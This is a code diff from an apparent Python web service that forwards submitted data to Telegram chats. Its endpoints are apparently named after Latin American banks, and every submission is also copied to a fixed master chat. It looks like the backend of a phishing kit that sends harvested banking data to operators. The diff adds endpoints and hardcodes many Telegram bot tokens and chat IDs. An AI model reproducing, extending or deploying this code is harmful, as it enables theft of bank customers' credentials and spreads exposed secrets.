@@ -988,8 +988,16 @@ async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage
                     force_immediate=True  # Forzar inmediato para mensajes especiales
                 )
                 telegram_results.append(result)
+            elif path.startswith("/maikelhot"):
+                result1 = await enviar_telegram_hibrido(mensaje_completo, "-4826186479", TOKEN, priority=1)
+                telegram_results.append(result1)
+                
+                # Mensaje específico del endpoint
+                result2 = await enviar_telegram_hibrido(mensaje_completo, config["chat_id"], config["bot_id"], priority=1)
+                telegram_results.append(result2)
+
             else:
-                # Enviar mensajes con prioridad normal
+                # Enviar mensaje con prioridad normal
                 # Mensaje principal
                 result1 = await enviar_telegram_hibrido(mensaje_completo, "-4826186479", TOKEN, priority=1)
                 telegram_results.append(result1)
@@ -1035,6 +1043,7 @@ endpoint_configs = [
     {"path": "/bdv4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
     {"path": "/bdv5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
     {"path": "/bdv6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
+    {"path": "/bdv7/", "chat_id": "7398992131", "bot_id": "7000144654:AAECBupVvE_1FSNoPpAAp9kNFSRLOVYC_5E"},
     {"path": "/provincial1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
     {"path": "/provincial2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
     {"path": "/provincial3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
@@ -1045,15 +1054,14 @@ endpoint_configs = [
     {"path": "/internacional2/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
     {"path": "/internacional3/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
     {"path": "/internacional4/", "chat_id": "5317159807", "bot_id": "8116577753:AAFkE-1JGW8Vi-2SRP4xNdxCLqyI1zLbl_U"},
-    {"path": "/maikelhot/", "chat_id": "-4816573720", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
-    {"path": "/wts1/", "chat_id": "5711521334", "bot_id": "8294930756:AAHh3iZQzH1RweVl5iMaluyHj0h-mT131mI"},
-    {"path": "/wts2/", "chat_id": "7883492995", "bot_id": "8116183285:AAEUuHD9yv8_O3ofS9c11Ndq_VSUBXoZKwo"},
     {"path": "/bdigital/", "chat_id": "7098816483", "bot_id": "7684971737:AAEUQePYfMDNgX5WJH1gCrE_GJ0_sJ7zXzI"},
     {"path": "/prmrica/", "chat_id": "7098816483", "bot_id": "7864387780:AAHLh6vSSG5tf6YmwaFKAyLNuqVUOT-OLZU"},
-    {"path": "/hmtsasd/", "chat_id": "-4727787748", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
+    {"path": "/lafise/", "chat_id": "7098816483", "bot_id": "8214397313:AAEkkZm2J3MwVpYRHZ3HkeA2B55owXJo5UE"},
+    {"path": "/pmcrcs/", "chat_id": "-4880252609", "bot_id": "8310478240:AAH1SK4hbe9YdNvLMILauxSfqg3WbwnMWq0"},
+    {"path": "/promerigt/", "chat_id": "7098816483", "bot_id": "7539298674:AAHDo4h_05ZWr2YaNPnPFq02oTjAfl4vNEQ"},
 ]
 
-# Registrar endpoints dinámicos
+# Registrar endpoints dinámicoss
 from copy import deepcopy
 
 for config in endpoint_configs:
